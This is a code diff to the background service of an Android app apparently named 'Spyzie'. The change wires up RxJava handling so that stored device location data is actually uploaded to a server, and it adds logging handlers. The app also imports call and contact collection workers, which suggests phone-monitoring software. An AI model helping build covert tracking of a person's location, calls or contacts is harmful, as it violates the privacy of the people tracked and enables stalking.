@@ -34,6 +34,7 @@ import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.db.DbManager;
 import com.tantd.spyzie.data.device.worker.GetCallsWorker;
 import com.tantd.spyzie.data.device.worker.GetContactsWorker;
+import com.tantd.spyzie.data.model.CommonResponse;
 import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.di.module.ServiceModule;
@@ -42,6 +43,7 @@ import com.tantd.spyzie.receiver.SpyzieReceiver;
 import com.tantd.spyzie.util.CommonUtils;
 import com.tantd.spyzie.util.Constants;
 import com.tantd.spyzie.util.NetworkUtils;
+import com.tantd.spyzie.util.rx.SchedulerProvider;
 
 import java.util.List;
 import java.util.concurrent.TimeUnit;
@@ -54,6 +56,8 @@ public class MainService extends Service {
     ApiManager mApiManager;
     @Inject
     DbManager mDbManager;
+    @Inject
+    SchedulerProvider mSchedulerProvider;
 
     private static final String DEBUG_SUB_TAG = "[" + MainService.class.getSimpleName() + "] ";
     private static final String CHANNEL_ID = "ForegroundServiceChannel";
@@ -160,13 +164,28 @@ public class MainService extends Service {
                     (List<com.tantd.spyzie.data.model.Location>) mDbManager.find(com.tantd.spyzie.data.model.Location.class
                             , 0, Constants.MAX_READ_DATA_ENTRIES);
             savedData.add(location);
-            mApiManager.sendLocationData(savedData);
+            mApiManager.sendLocationData(savedData).subscribeOn(mSchedulerProvider.io())
+                    .observeOn(mSchedulerProvider.ui())
+                    .subscribe(commonResponse -> handleSendingSuccess(commonResponse),
+                            error -> handleSendingError(error));
             savedData.remove(savedData.size() - 1);
             if (savedData.size() > 0) {
                 mDbManager.removeLocations(savedData);
             }
         } else {
             mDbManager.put(location);
+        }
+    }
+
+    private void handleSendingSuccess(CommonResponse response) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingSuccess, response=" + response);
+        }
+    }
+
+    private void handleSendingError(Throwable error) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingError: " + error);
         }
     }
 
